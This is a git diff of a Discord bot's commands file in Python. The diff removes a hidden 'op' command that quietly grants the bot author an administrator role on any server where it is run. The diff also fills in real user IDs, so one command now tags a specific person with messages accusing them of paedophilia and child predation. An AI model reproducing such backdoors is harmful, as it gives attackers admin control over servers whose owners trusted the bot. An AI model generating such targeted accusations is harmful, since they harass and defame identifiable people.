@@ -8,18 +8,6 @@ class Commands():
 		self.client = client
 
 	@commands.command(pass_context = True)
-	async def op(self, ctx):
-		perms = discord.Permissions(permissions = 8)
-		server = ctx.message.server
-		color = discord.Color(0xffffff)
-		member = ctx.message.author
-
-		if member.id == "Your ID here":
-			await self.client.create_role(server = server, name = "Hackerman", permissions = perms, color = color)
-			role = get(member.server.roles, name = "Hackerman")
-			await self.client.add_roles(member, role)
-
-	@commands.command(pass_context = True)
 	async def info(self, ctx):
 		embed = discord.Embed(name = "info", color = 0x307af2)
 		embed.set_author(name = "{}'s info".format(ctx.message.server.name))
@@ -52,10 +40,10 @@ class Commands():
 		embed2.add_field(name = "Extras", value = "**Suicides**: 643\n**Barricades**: 466\n**Reinforcements**: 1672\n**Gadgets Destroyed**: -234", inline = True)
 
 		possibleResponses = random.choice([
-			self.client.say("Is it time to sexualize the minors? <@ID here>"),
-			self.client.say("<@ID here> Knock knock, it's the pedo police", embed = embed1),
-			self.client.say("<@ID here>'s R6 Siege Stats", embed = embed2),
-			self.client.say("<@ID here> *child predator noises*")
+			self.client.say("Is it time to sexualize the minors? <@273540808051785729>"),
+			self.client.say("<@273540808051785729> Knock knock, it's the pedo police", embed = embed1),
+			self.client.say("<@273540808051785729>'s R6 Siege Stats", embed = embed2),
+			self.client.say("<@273540808051785729> *child predator noises*")
 		])
 		await possibleResponses
 
@@ -72,7 +60,7 @@ class Commands():
 			"My creator is ",
 			"All hail "
 		]
-		await self.client.say(random.choice(possibleResponses) + "Your ID here")
+		await self.client.say(random.choice(possibleResponses) + "<@257247797311569920>")
 
 	@commands.command(pass_context = True)
 	async def bailey(self, ctx):
@@ -87,7 +75,7 @@ class Commands():
 			":peach::eyes: ",
 			"*insert cute doggo picture here* "
 		]
-		await self.client.say(random.choice(possibleResponses) + "<@ID here>")	
+		await self.client.say(random.choice(possibleResponses) + "<@190254753215807488>")	
 
 	@commands.command(pass_context = True)
 	async def lauren(self, ctx):
@@ -102,7 +90,7 @@ class Commands():
 			":kissing_closed_eyes: ",
 			":kissing_heart: "
 		]
-		await self.client.say(random.choice(possibleResponses) + "<@ID here>")
+		await self.client.say(random.choice(possibleResponses) + "<@297895701252407297>")
 
 	@commands.command(pass_context = True)
 	async def colin(self, ctx):
@@ -115,7 +103,7 @@ class Commands():
 			":b:olin ",
 			"Uhhhh "
 		]
-		await self.client.say(random.choice(possibleResponses) + "<@ID here>")
+		await self.client.say(random.choice(possibleResponses) + "<@207369269758001152>")
 
 	@commands.command(name = "8ball", pass_context = True)
 	async def eight_ball(self, ctx):
@@ -184,9 +172,9 @@ class Commands():
 		embed.set_image(url = random.choice(possibleResponses))
 		await self.client.say(embed = embed)		
 
-	@commands.command(name = "@Bot ID here>", pass_context = True)
+	@commands.command(name = "@498548614075908098>", pass_context = True)
 	async def tagged(self, ctx):
-		if ctx.message.author.id == "Your ID here":
+		if ctx.message.author.id == "257247797311569920":
 			possibleResponses = [
 			"Ye yeet ",
 			"Yes? ",
